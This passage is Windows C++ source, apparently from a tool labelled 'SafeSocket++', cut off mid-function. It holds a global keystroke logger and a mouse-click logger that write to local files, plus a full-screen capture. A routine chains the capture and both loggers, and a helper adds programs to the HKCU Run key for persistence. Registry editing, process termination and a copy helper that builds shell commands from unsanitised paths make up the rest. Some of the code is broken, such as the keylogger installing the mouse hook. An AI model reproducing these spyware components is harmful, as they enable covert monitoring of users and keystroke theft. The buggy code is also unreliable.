//c++ libraries
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <ctime>
#include <iomanip>


//C libraries
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <intrin.h>
#include <string.h>
#include <io.h>
#include <direct.h>
#include <errno.h>
#include <stdbool.h>
#include <aclapi.h>
#include <TlHelp32.h>
//custom libraries



//prograsm defines
#define BUFFER_SIZE 1024
#define F_OK 0 // Define F_OK for Windows
#define PATH_SEPARATOR '\\'
#define MAX_PATH_LEN 260  // Maximum path length

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

//namespaces
using namespace std;




// Function prototypes
void viewTasks();
void listProcesses();
bool terminateProcess(DWORD processID);

//mouse log
HHOOK hHook = NULL;
FILE *outputFile = NULL;

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_LBUTTONDOWN) {
            printf("Left mouse button clicked.\n");
            fprintf(outputFile, "Left mouse button clicked.\n");
        } else if (wParam == WM_RBUTTONDOWN) {
            printf("Right mouse button clicked.\n");
            fprintf(outputFile, "Right mouse button clicked.\n");
        } else if (wParam == WM_MBUTTONDOWN) {
            printf("Middle mouse button clicked.\n");
            fprintf(outputFile, "Middle mouse button clicked.\n");
        }
        fflush(outputFile);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void SetHook() {
    if (!(hHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0))) {
        fprintf(stderr, "Failed to install hook!\n");
    }
}

void ReleaseHook() {
    UnhookWindowsHookEx(hHook);
}






int mouissss(){
	outputFile = fopen("mouse_log.txt", "a");
    if (outputFile == NULL) {
        fprintf(stderr, "Failed to open output file!\n");
        return EXIT_FAILURE;
    }

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    ReleaseHook();
    fclose(outputFile);
}









//keylog



LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN) {
            DWORD vkCode = p->vkCode;
            char key;
            if (vkCode >= 0x30 && vkCode <= 0x5A) {  // Alphanumeric keys
                key = (char)vkCode;
            } else if (vkCode == VK_SPACE) {
                key = ' ';
            } else {
                key = '?';  // Unknown key for simplicity
            }
            printf("Key %c has been pressed\n", key);
            fprintf(outputFile, "%c", key);
            fflush(outputFile);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}


//add specific details of where the mouse clicked and show imagery where id did actuaslly

int KeyLGHandlF(){
	
	outputFile = fopen("keylog.txt", "a");
    if (outputFile == NULL) {
        fprintf(stderr, "Failed to open output file!\n");
        return EXIT_FAILURE;
    }

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    ReleaseHook();
    fclose(outputFile);
}












bool FileExists(const std::wstring& filePath) {
    DWORD fileAttributes = GetFileAttributesW(filePath.c_str());
    return (fileAttributes != INVALID_FILE_ATTRIBUTES && !(fileAttributes & FILE_ATTRIBUTE_DIRECTORY));
}

bool SetWallpaper(const std::wstring& wallpaperPath) {
    // Check if the file exists
    if (!FileExists(wallpaperPath)) {
        std::wcerr << L"Error: File does not exist - " << wallpaperPath << std::endl;
        return false;
    }

    // Set the wallpaper
    if (!SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wallpaperPath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
        std::wcerr << L"Error setting wallpaper. Error code: " << GetLastError() << std::endl;
        return false;
    }

    std::wcout << L"Wallpaper set successfully: " << wallpaperPath << std::endl;
    return true;
}

void PrintMenu() {
    std::wcout << L"===== Wallpaper Changer Menu =====" << std::endl;
    std::wcout << L"1. Change Wallpaper" << std::endl;
    std::wcout << L"2. Exit" << std::endl;
    std::wcout << L"==================================" << std::endl;
}


void ChangeWallpprMenu(){
	system("cls");
	 int choice;
    std::wstring wallpaperPath;

    do {
        PrintMenu();
        std::wcout << L"Enter your choice: ";
        std::wcin >> choice;

        switch (choice) {
            case 1:
                std::wcout << L"Enter the path to your image file: ";
                std::wcin.ignore(); // Ignore newline character left in buffer
                std::getline(std::wcin, wallpaperPath);
                if (SetWallpaper(wallpaperPath)) {
                    std::wcout << L"Wallpaper changed successfully!" << std::endl;
                } else {
                    std::wcerr << L"Failed to change wallpaper." << std::endl;
                }
                break;
            case 2:
                std::wcout << L"Exiting program..." << std::endl;
                break;
            default:
                std::wcerr << L"Invalid choice. Please try again." << std::endl;
                break;
        }

    } while (choice != 2);

}






void CaptureScreen(const char* filename) {
    // Get the handle of the desktop window
    HWND hDesktopWnd = GetDesktopWindow();

    // Get the device context of the screen
    HDC hDesktopDC = GetDC(hDesktopWnd);

    // Get the dimensions of the screen
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Create a compatible bitmap
    HBITMAP hBitmap = CreateCompatibleBitmap(hDesktopDC, screenWidth, screenHeight);

    // Create a memory device context
    HDC hMemoryDC = CreateCompatibleDC(hDesktopDC);

    // Select the compatible bitmap into the memory DC
    SelectObject(hMemoryDC, hBitmap);

    // Copy the screen to the memory DC
    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hDesktopDC, 0, 0, SRCCOPY);

    // Save bitmap to file
    BITMAPFILEHEADER bmfh;
    bmfh.bfType = 0x4D42;  // "BM"
    bmfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + screenWidth * screenHeight * 4;
    bmfh.bfReserved1 = 0;
    bmfh.bfReserved2 = 0;
    bmfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = screenWidth;
    bi.biHeight = screenHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;  // 32-bit RGBA
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;  // Can be 0 for BI_RGB bitmaps
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    // Open file for writing
    ofstream file(filename, std::ios::out | std::ios::binary);
    if (!file) {
        cerr << "Error: Unable to open file for writing.\n";
        ReleaseDC(hDesktopWnd, hDesktopDC);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        return;
    }

    // Write the bitmap file header
    file.write(reinterpret_cast<const char*>(&bmfh), sizeof(BITMAPFILEHEADER));

    // Write the bitmap info header
    file.write(reinterpret_cast<const char*>(&bi), sizeof(BITMAPINFOHEADER));

    // Get bitmap bits
    BYTE* lpBits = new BYTE[screenWidth * screenHeight * 4];
    GetDIBits(hMemoryDC, hBitmap, 0, screenHeight, lpBits, reinterpret_cast<BITMAPINFO*>(&bi), DIB_RGB_COLORS);

    // Write bitmap data
    file.write(reinterpret_cast<const char*>(lpBits), screenWidth * screenHeight * 4);

    // Clean up
    delete[] lpBits;
    file.close();

    // Cleanup
    ReleaseDC(hDesktopWnd, hDesktopDC);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
}







//make it with choices
int handling(){
	CaptureScreen("screenshot.bmp");
     mouissss();
    KeyLGHandlF();
    cout << "Screenshot saved as screenshot.bmp\n";
    ChangeWallpprMenu();
}



































// Function definition for TaskManInfMenu, which returns an integer.
int TaskManInfMenu() {
    // Declare a variable to store the user's choice.
    int choice;

    // Start an infinite loop to repeatedly display the menu until the user chooses to exit.
    while (true) {
        // Display the menu options to the user.
        cout << "\nTask Management System\n";
        cout << "1. View Running Tasks\n";
        cout << "2. View Running Processes\n";
        cout << "3. Terminate Process\n";
        cout << "4. Exit\n";
        cout << "Enter your choice: ";

        // Read the user's choice from the input.
        cin >> choice;

        // Use a switch statement to handle the user's choice.
        switch (choice) {
            // If the user chooses option 1, call the viewTasks function.
            case 1:
                viewTasks();
                break;

            // If the user chooses option 2, call the listProcesses function.
            case 2:
                listProcesses();
                break;

            // If the user chooses option 3, execute the block for terminating a process.
            case 3: {
                // Declare a variable to store the process ID.
                DWORD processID;
                
                // Prompt the user to enter the process ID to terminate.
                cout << "Enter process ID to terminate: ";
                
                // Read the process ID from the input.
                cin >> processID;
                
                // Attempt to terminate the process with the given ID.
                if (terminateProcess(processID)) {
                    // If successful, inform the user.
                    cout << "Process terminated successfully.\n";
                } else {
                    // If unsuccessful, inform the user and display the error code.
                    cerr << "Failed to terminate process. Error code: " << GetLastError() << "\n";
                }
                break; // Break out of the switch statement.
            }
            
            // If the user chooses option 4, print exiting message and return 0 to exit the function.
            case 4:
                cout << "Exiting...\n";
                return 0;
            
            // If the user enters an invalid choice, prompt them to try again.
            default:
                cout << "Invalid choice. Please try again.\n";
        }
    }
}



// Function definition for viewTasks, which returns void (no return value).
void viewTasks() {
    // Print a heading to the console indicating the start of the running tasks list.
    cout << "\nRunning Tasks:\n";
    
    // Print a line separator for better readability.
    cout << "----------------\n";
    
    // Call the listProcesses function to display the currently running processes/tasks.
    listProcesses();
}

// Function definition for listProcesses, which returns void (no return value).
void listProcesses() {
    // Declare variables for handling the snapshot and process entry.
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    // Check if the snapshot was taken successfully.
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        // Print an error message if the snapshot failed.
        cerr << "Error: CreateToolhelp32Snapshot failed\n";
        return; // Exit the function.
    }

    // Set the size of the PROCESSENTRY32 structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process,
    // and exit if unsuccessful.
    if (!Process32First(hProcessSnap, &pe32)) {
        // Print an error message if the retrieval failed.
        cerr << "Error: Process32First failed\n";
        
        // Close the snapshot handle to clean up resources.
        CloseHandle(hProcessSnap);
        
        return; // Exit the function.
    }

    // Iterate over the snapshot of processes,
    // and display information about each process.
    do {
        // Print the process ID.
        cout << "Process ID: " << pe32.th32ProcessID << endl;

        // Print the executable name of the process.
        cout << "  Executable name: " << pe32.szExeFile << endl;

        // Print the parent process ID.
        cout << "  Parent process ID: " << pe32.th32ParentProcessID << endl;

        // Print the number of threads in the process.
        cout << "  Threads: " << pe32.cntThreads << endl;

        // Print the base priority class of the process.
        cout << "  Priority class: " << pe32.pcPriClassBase << endl;

        // Print the memory usage of the process in KB.
        cout << "  Memory usage: " << pe32.dwSize / 1024 << " KB" << endl << endl;

    // Continue to the next process in the snapshot.
    } while (Process32Next(hProcessSnap, &pe32));

    // Close the snapshot handle to clean up resources.
    CloseHandle(hProcessSnap);
}

// Function definition for terminateProcess, which takes a process ID as an argument and returns a boolean.
bool terminateProcess(DWORD processID) {
    // Attempt to open the process with the given process ID and obtain a handle with terminate permissions.
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processID);

    // Check if the process handle was obtained successfully.
    if (hProcess == NULL) {
        // Print an error message if the process could not be opened, including the error code.
        std::cerr << "Failed to open process. Error code: " << GetLastError() << "\n";
        return false; // Return false to indicate failure.
    }

    // Attempt to terminate the process using the handle.
    if (!TerminateProcess(hProcess, 0)) {
        // Print an error message if the process could not be terminated, including the error code.
        cerr << "Failed to terminate process. Error code: " << GetLastError() << "\n";

        // Close the process handle to clean up resources.
        CloseHandle(hProcess);
        
        return false; // Return false to indicate failure.
    }

    // Close the process handle to clean up resources.
    CloseHandle(hProcess);
    
    return true; // Return true to indicate success.
}











// Function definition for addStartupEntry, which takes the application name and path as arguments and returns a boolean.
bool addStartupEntry(const wstring& appName, const wstring& appPath) {
    // Declare a variable for the registry key handle.
    HKEY hKey;

    // Attempt to create or open the registry key for the current user's startup programs.
    LONG result = RegCreateKeyExW(
        HKEY_CURRENT_USER, // Root key for the current user.
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", // Path to the Run key.
        0, // Reserved, must be 0.
        NULL, // Class type, not used here.
        REG_OPTION_NON_VOLATILE, // Options for the key, non-volatile means it will persist.
        KEY_WRITE, // Desired access for the key, in this case, write access.
        NULL, // Security attributes, NULL means default.
        &hKey, // Pointer to the handle to be opened or created.
        NULL // Disposition value, not used here.
    );

    // Check if the registry key was created or opened successfully.
    if (result != ERROR_SUCCESS) {
        // Print an error message if the key creation or opening failed.
        cerr << "Error creating registry key: " << result << endl;
        return false; // Return false to indicate failure.
    }

    // Attempt to set the value for the startup entry in the registry.
    result = RegSetValueExW(
        hKey, // Handle to the opened key.
        appName.c_str(), // Name of the value to be set.
        0, // Reserved, must be 0.
        REG_SZ, // Type of the value, REG_SZ means a null-terminated string.
        (BYTE*)appPath.c_str(), // Data for the value, cast to BYTE*.
        (appPath.size() + 1) * sizeof(wchar_t) // Size of the data in bytes, including the null terminator.
    );

    // Check if the value was set successfully.
    if (result != ERROR_SUCCESS) {
        // Print an error message if the value setting failed.
        cerr << "Error setting registry value: " << result << endl;

        // Close the registry key handle to clean up resources.
        RegCloseKey(hKey);

        return false; // Return false to indicate failure.
    }

    // Close the registry key handle to clean up resources.
    RegCloseKey(hKey);

    // Print a success message.
    cout << "Startup entry added successfully." << endl;

    return true; // Return true to indicate success.
}



// Function definition for removeStartupEntry, which takes the application name as an argument and returns a boolean.
bool removeStartupEntry(const wstring& appName) {
    // Declare a variable for the registry key handle.
    HKEY hKey;

    // Attempt to open the registry key for the current user's startup programs.
    LONG result = RegOpenKeyExW(
        HKEY_CURRENT_USER, // Root key for the current user.
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", // Path to the Run key.
        0, // Reserved, must be 0.
        KEY_WRITE, // Desired access for the key, in this case, write access.
        &hKey // Pointer to the handle to be opened.
    );

    // Check if the registry key was opened successfully.
    if (result != ERROR_SUCCESS) {
        // Print an error message if the key opening failed.
        cerr << "Error opening registry key: " << result << endl;
        return false; // Return false to indicate failure.
    }

    // Attempt to delete the value for the startup entry in the registry.
    result = RegDeleteValueW(
        hKey, // Handle to the opened key.
        appName.c_str() // Name of the value to be deleted.
    );

    // Check if the value was deleted successfully.
    if (result != ERROR_SUCCESS) {
        // Print an error message if the value deletion failed.
        cerr << "Error deleting registry value: " << result << endl;

        // Close the registry key handle to clean up resources.
        RegCloseKey(hKey);

        return false; // Return false to indicate failure.
    }

    // Close the registry key handle to clean up resources.
    RegCloseKey(hKey);

    // Print a success message.
    cout << "Startup entry removed successfully." << endl;

    return true; // Return true to indicate success.
}


// Function definition for showMenu, which displays menu options to the user.
void showMenu() {
    // Print the menu header to the console.
    cout << "\n========== Startup Manager ==========\n";
    
    // Print the option to add a program to startup.
    cout << "1. Add a program to startup\n";
    
    // Print the option to remove a program from startup.
    cout << "2. Remove a program from startup\n";
    
    // Print the option to exit the menu.
    cout << "3. Exit\n";
    
    // Print the menu footer for better readability.
    cout << "======================================\n";
    
    // Prompt the user to enter their choice.
    cout << "Enter your choice (1-3): ";
}


// Function definition for ShowMenuHandlingF, which handles menu operations.
void ShowMenuHandlingF() {
    // Declare a variable to store the user's menu choice.
    int choice;
    
    // Declare variables to store the application name and path.
    wstring appName, appPath;

    // Start a do-while loop to display the menu and handle user input.
    do {
        // Call the showMenu function to display the menu.
        showMenu();
        
        // Read the user's choice from the input.
        cin >> choice;
        
        // Ignore the newline character left in the input buffer.
        cin.ignore();

        // Use a switch statement to handle the user's choice.
        switch (choice) {
            // If the user chooses option 1, add a program to startup.
            case 1:
                // Prompt the user to enter the application name for startup.
                cout << "Enter application name for startup: ";
                getline(wcin, appName); // Read the application name.
                
                // Prompt the user to enter the application path.
                wcout << L"Enter application path (e.g., C:\\Path\\To\\Program.exe): ";
                getline(wcin, appPath); // Read the application path.
                
                // Attempt to add the startup entry and handle any failure.
                if (!addStartupEntry(appName, appPath)) {
                    cerr << "Failed to add startup entry.\n"; // Print an error message if the addition fails.
                }
                break;

            // If the user chooses option 2, remove a program from startup.
            case 2:
                // Prompt the user to enter the application name to remove from startup.
                cout << "Enter application name to remove from startup: ";
                getline(wcin, appName); // Read the application name.
                
                // Attempt to remove the startup entry and handle any failure.
                if (!removeStartupEntry(appName)) {
                    cerr << "Failed to remove startup entry.\n"; // Print an error message if the removal fails.
                }
                break;

            // If the user chooses option 3, exit the program.
            case 3:
                cout << "Exiting program.\n"; // Print an exiting message.
                break;

            // Handle invalid choices.
            default:
                cerr << "Invalid choice. Please enter a number between 1 and 3.\n"; // Print an error message for invalid choices.
                break;
        }

    // Continue the loop until the user chooses to exit (choice == 3).
    } while (choice != 3);
}











// Function definition for readRegistryValue, which reads a value from the registry.
void readRegistryValue(HKEY hKey, LPCSTR subKey, LPCSTR valueName) {
    // Declare a variable for the registry key handle.
    HKEY key;

    // Attempt to open the specified registry key.
    if (RegOpenKeyExA(hKey, subKey, 0, KEY_READ, &key) == ERROR_SUCCESS) {
        // Declare variables to store the size and type of the registry data.
        DWORD dataSize = 0;
        DWORD dataType;

        // Query the size and type of the specified value.
        if (RegQueryValueExA(key, valueName, NULL, &dataType, NULL, &dataSize) == ERROR_SUCCESS) {
            // Check if the data type is a string.
            if (dataType == REG_SZ || dataType == REG_EXPAND_SZ) {
                // Allocate a buffer to hold the value data.
                char* buffer = new char[dataSize];

                // Query the actual value data.
                if (RegQueryValueExA(key, valueName, NULL, NULL, (LPBYTE)buffer, &dataSize) == ERROR_SUCCESS) {
                    // Print the value data to the console.
                    cout << "Value: " << buffer << endl;
                } else {
                    // Print an error message if the value data could not be read.
                    cout << "Failed to read registry value." << endl;
                }

                // Deallocate the buffer.
                delete[] buffer;
            } else {
                // Print an error message if the data type is unsupported.
                cout << "Unsupported data type." << endl;
            }
        } else {
            // Print an error message if the value size and type could not be queried.
            cout << "Failed to read registry value." << endl;
        }

        // Close the registry key handle to clean up resources.
        RegCloseKey(key);
    } else {
        // Print an error message if the registry key could not be opened.
        cout << "Failed to open registry key." << endl;
    }
}

// Function definition for writeRegistryValue, which writes a value to the registry.
void writeRegistryValue(HKEY hKey, LPCSTR subKey, LPCSTR valueName, LPCSTR data) {
    // Declare a variable for the registry key handle.
    HKEY key;
    
    // Declare a variable for the disposition value.
    DWORD disposition;

    // Attempt to create or open the specified registry key.
    if (RegCreateKeyExA(
            hKey, // Handle to an open registry key.
            subKey, // Subkey to open or create.
            0, // Reserved, must be 0.
            NULL, // Class type, not used here.
            REG_OPTION_NON_VOLATILE, // Options for the key, non-volatile means it will persist.
            KEY_WRITE, // Desired access for the key, in this case, write access.
            NULL, // Security attributes, NULL means default.
            &key, // Pointer to the handle to be opened or created.
            &disposition // Pointer to a variable that receives the disposition value.
        ) == ERROR_SUCCESS) {

        // Attempt to set the value for the specified registry key.
        if (RegSetValueExA(
                key, // Handle to the open key.
                valueName, // Name of the value to set.
                0, // Reserved, must be 0.
                REG_SZ, // Type of the value, REG_SZ means a null-terminated string.
                (const BYTE*)data, // Data for the value, cast to const BYTE*.
                strlen(data) + 1 // Size of the data in bytes, including the null terminator.
            ) == ERROR_SUCCESS) {
            
            // Print a success message if the value was written successfully.
            cout << "Value written successfully." << endl;
        } else {
            // Print an error message if the value could not be written.
            cout << "Failed to write registry value." << endl;
        }

        // Close the registry key handle to clean up resources.
        RegCloseKey(key);
    } else {
        // Print an error message if the registry key could not be created or opened.
        cout << "Failed to create or open registry key." << endl;
    }
}


// Function definition for displayMenu, which displays a menu for registry editor operations.
void displayMenu() {
    // Print the menu header to the console.
    cout << "\nRegistry Editor Menu:" << endl;
    
    // Print option 1 to read a registry value.
    cout << "1. Read Registry Value" << endl;
    
    // Print option 2 to write a registry value.
    cout << "2. Write Registry Value" << endl;
    
    // Print option 3 to exit the program.
    cout << "3. Exit" << endl;
    
    // Prompt the user to enter their choice.
    cout << "Enter your choice: ";
}



// Function definition for RegMenuHandlF, which handles registry menu operations.
int RegMenuHandlF() {
    // Declare variables for user input and data storage.
    int choice;
    char subKey[MAX_PATH];
    char valueName[MAX_PATH];
    char data[MAX_PATH];

    // Start an infinite loop to display the menu and handle user input.
    while (true) {
        // Display the menu options using the displayMenu function.
        displayMenu();
        
        // Read the user's choice from the input.
        cin >> choice;

        // Use a switch statement to handle the user's choice.
        switch (choice) {
            // Option 1: Read a registry value.
            case 1:
                // Prompt the user to enter the subkey and value name.
                cout << "Enter subkey: ";
                cin >> subKey;
                cout << "Enter value name: ";
                cin >> valueName;
                
                // Call the readRegistryValue function to read the specified registry value.
                readRegistryValue(HKEY_CURRENT_USER, subKey, valueName);
                break;

            // Option 2: Write a registry value.
            case 2:
                // Prompt the user to enter the subkey, value name, and data.
                cout << "Enter subkey: ";
                cin >> subKey;
                cout << "Enter value name: ";
                cin >> valueName;
                cout << "Enter data: ";
                cin >> data;
                
                // Call the writeRegistryValue function to write the specified registry value.
                writeRegistryValue(HKEY_CURRENT_USER, subKey, valueName, data);
                break;

            // Option 3: Exit the program.
            case 3:
                cout << "Exiting program." << endl;
                return 0;

            // Default case: Handle invalid choices.
            default:
                cout << "Invalid choice. Please try again." << endl;
                break;
        }
    }
}




//function that handles main menu for user.....
void MainMenu(){
	system("cls");
	cout<<"-------------------------------------------------\n";
	cout<<"[+] More advanced functionalities of SafeSocket++\n";
	cout<<"-------------------------------------------------\n\n\n";
	

	cout<<"[+] Make a choice: "<<endl<<endl;
	cout<<"-----------------------------------\n";
	cout<<"| 1. Startup functionalities      |"<<endl;
	cout<<"-----------------------------------\n";
	cout<<"| 2. Registry functionalities     |"<<endl;
	cout<<"-----------------------------------\n";
	cout<<"| 3. Task Manager Functionalities |"<<endl;
	cout<<"-----------------------------------\n";
	
	int choice;
	cin>>choice;
	
	if(choice==1){
		system("cls");
		ShowMenuHandlingF();
	}else if(choice==2){
		system("cls");
		RegMenuHandlF();
	}else if(choice==3){
		system("cls");
		TaskManInfMenu();
	}
}

































// Function to monitor changes in a specified directory
void monitor_directory(const char *dirname) {
    HANDLE hDir; // Handle to the directory
    char buffer[BUFFER_SIZE]; // Buffer to store directory changes
    DWORD dwBytesReturned; // Number of bytes returned from ReadDirectoryChangesW
    BOOL result; // Result of the ReadDirectoryChangesW function call

    // Open the directory to monitor changes
    hDir = CreateFile(dirname, // Directory path
                      FILE_LIST_DIRECTORY, // Access mode to list the directory
                      FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, // Share modes
                      NULL, // Security attributes
                      OPEN_EXISTING, // Opens the directory if it exists
                      FILE_FLAG_BACKUP_SEMANTICS, // Flags to indicate the handle can be used to perform backup or restore operations
                      NULL); // Template file (not used)

    // Check if the directory handle is invalid
    if (hDir == INVALID_HANDLE_VALUE) {
        // Print an error message if the directory could not be opened
        fprintf(stderr, "Error opening directory %s\n", dirname);
        return; // Exit the function
    }

    // Print a message indicating that the directory is being monitored
    printf("Monitoring directory '%s' for changes...\n", dirname);

    // Infinite loop to keep monitoring the directory
    while (1) {
        // Read changes in the directory
        result = ReadDirectoryChangesW(hDir, // Handle to the directory
                                       buffer, // Buffer to store changes
                                       BUFFER_SIZE, // Size of the buffer
                                       FALSE, // Watch the directory and not its subdirectories
                                       FILE_NOTIFY_CHANGE_LAST_WRITE | FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME, // Filter for changes to file write, file name, and directory name
                                       &dwBytesReturned, // Number of bytes returned
                                       NULL, // Overlapped structure (not used)
                                       NULL); // Completion routine (not used)

        // Check if changes were successfully read
        if (result) {
            // Print a message indicating that the directory was modified
            printf("Directory '%s' has been modified.\n", dirname);
        } else {
            // Print an error message if there was an issue reading the directory changes
            fprintf(stderr, "Error reading directory changes.\n");
            break; // Exit the loop
        }
    }

    // Close the directory handle
    CloseHandle(hDir);
}




// Function to monitor changes in a specified file
void monitor_file(const char *filename) {
    HANDLE hFile; // Handle to the file
    char buffer[BUFFER_SIZE]; // Buffer to store file changes
    DWORD dwBytesReturned; // Number of bytes returned from ReadDirectoryChangesW
    BOOL result; // Result of the ReadDirectoryChangesW function call

    // Open the file to monitor changes
    hFile = CreateFile(filename, // File path
                       FILE_GENERIC_READ, // Access mode to read the file
                       FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, // Share modes
                       NULL, // Security attributes
                       OPEN_EXISTING, // Opens the file if it exists
                       FILE_ATTRIBUTE_NORMAL, // File attributes
                       NULL); // Template file (not used)

    // Check if the file handle is invalid
    if (hFile == INVALID_HANDLE_VALUE) {
        // Print an error message if the file could not be opened
        fprintf(stderr, "Error opening file %s\n", filename);
        return; // Exit the function
    }

    // Print a message indicating that the file is being monitored
    printf("Monitoring file '%s' for changes...\n", filename);

    // Infinite loop to keep monitoring the file
    while (1) {
        // Read changes in the file
        result = ReadDirectoryChangesW(hFile, // Handle to the file
                                       buffer, // Buffer to store changes
                                       BUFFER_SIZE, // Size of the buffer
                                       FALSE, // Watch the file and not its subdirectories (if any)
                                       FILE_NOTIFY_CHANGE_LAST_WRITE, // Filter for changes to file write
                                       &dwBytesReturned, // Number of bytes returned
                                       NULL, // Overlapped structure (not used)
                                       NULL); // Completion routine (not used)

        // Check if changes were successfully read
        if (result) {
            // Print a message indicating that the file was modified
            printf("File '%s' has been modified.\n", filename);
        } else {
            // Print an error message if there was an issue reading the file changes
            fprintf(stderr, "Error reading file changes.\n");
            break; // Exit the loop
        }
    }

    // Close the file handle
    CloseHandle(hFile);
}



// Function to display a menu and monitor a directory or file based on user choice
void Monitor_menu(){
    int choice; // Variable to store the user's choice
    char name[MAX_PATH]; // Variable to store the name of the directory or file

    // Display the menu options to the user
    printf("Choose an option:\n");
    printf("1. Monitor directory\n"); // Option to monitor a directory
    printf("2. Monitor file\n"); // Option to monitor a file
    printf("Enter your choice (1 or 2): ");
    scanf("%d", &choice); // Read the user's choice

    // Check if the user chose to monitor a directory
    if (choice == 1) {
        printf("Enter the name of the directory to monitor: ");
        scanf("%s", name); // Read the name of the directory
        monitor_directory(name); // Call the function to monitor the directory
    }
    // Check if the user chose to monitor a file
    else if (choice == 2) {
        printf("Enter the name of the file to monitor: ");
        scanf("%s", name); // Read the name of the file
        monitor_file(name); // Call the function to monitor the file
    }
    // If the user entered an invalid choice
    else {
        printf("Invalid choice.\n"); // Print an error message
    }
}


// Function to move a file from source to destination
int moveFile(const char *source, const char *destination) {
    // Check if destination directory ends with '/' or '\'
    size_t len = strlen(destination); // Get the length of the destination path
    if (len > 0 && destination[len - 1] != PATH_SEPARATOR) { // Check if the last character is not the path separator
        printf("Invalid destination path. Please ensure it ends with '%c' for directories.\n", PATH_SEPARATOR);
        return 0; // Return 0 indicating failure
    }

    // Extract file name from source path
    const char *filename = strrchr(source, PATH_SEPARATOR); // Find the last occurrence of the path separator
    if (filename == NULL) {
        filename = source; // No directory separator found, use the whole source as filename
    } else {
        filename++; // Move past the '/' or '\'
    }

    // Construct full destination path
    char newpath[256]; // Buffer to store the new path
    snprintf(newpath, sizeof(newpath), "%s%s", destination, filename); // Construct the new path by concatenating destination and filename

    // Check if destination file already exists
    if (_access(newpath, F_OK) == 0) { // Check if the file already exists at the destination
        printf("File '%s' already exists in destination. Do you want to overwrite it? (y/n): ", filename);
        char answer;
        scanf(" %c", &answer); // Get user input to decide whether to overwrite
        if (answer != 'y' && answer != 'Y') { // If user input is not 'y' or 'Y'
            printf("Operation canceled. File not moved.\n");
            return 0; // Return 0 indicating failure
        }
    }

    // Move file
    if (rename(source, newpath) == 0) { // Attempt to rename (move) the file
        printf("File moved successfully to '%s'.\n", newpath); // Success message
        return 1; // Return 1 indicating success
    } else {
        perror("Error moving file"); // Print error message
        return 0; // Return 0 indicating failure
    }
}




// Function to rename a file or directory
int renameFileOrDirectory(const char *oldname, const char *newname) {
    // Check if newname already exists
    if (_access(newname, F_OK) == 0) { // Check if the file or directory already exists
        printf("File or directory '%s' already exists. Cannot overwrite.\n", newname);
        return 0; // Return 0 indicating failure
    }

    // Rename file or directory
    if (rename(oldname, newname) == 0) { // Attempt to rename (move) the file or directory
        printf("File/directory renamed successfully.\n"); // Print success message
        return 1; // Return 1 indicating success
    } else {
        perror("Error renaming file/directory"); // Print error message
        return 0; // Return 0 indicating failure
    }
}



int REN_MV_FILE_MENU(){
    int choice; // Variable to store user's menu choice
    char source[256], destination[256], newname[256]; // Arrays to store file paths and names

    printf("Choose an operation:\n"); // Display menu header
    printf("1. Rename File/Directory\n"); // Option to rename a file or directory
    printf("2. Move File/Directory\n"); // Option to move a file or directory
    printf("Enter your choice (1 or 2): "); // Prompt for user input
    scanf("%d", &choice); // Read user's choice

    switch (choice) { // Evaluate user's choice
        case 1:
            printf("Enter the old name (file or directory): "); // Prompt for old name
            scanf("%s", source); // Read old name
            printf("Enter the new name: "); // Prompt for new name
            scanf("%s", newname); // Read new name
            renameFileOrDirectory(source, newname); // Call function to rename file/directory
            break; // Exit switch statement
        case 2:
            printf("Enter the source path (file or directory): "); // Prompt for source path
            scanf("%s", source); // Read source path
            printf("Enter the destination path (directory to move into): "); // Prompt for destination path
            scanf("%s", destination); // Read destination path
            moveFile(source, destination); // Call function to move file/directory
            break; // Exit switch statement
        default:
            printf("Invalid choice. Please enter 1 or 2.\n"); // Print error message for invalid input
            return 1; // Return 1 indicating failure
    }
}


// Function to copy a file using system command
int copyFile(const char *source, const char *destination) {
    // Command to copy file using system command (Windows)
    char command[512]; // Buffer to store the command
    snprintf(command, sizeof(command), "copy /Y \"%s\" \"%s\"", source, destination); // Format the copy command

    int status = system(command); // Execute the command using system()

    // Check the status of the command execution
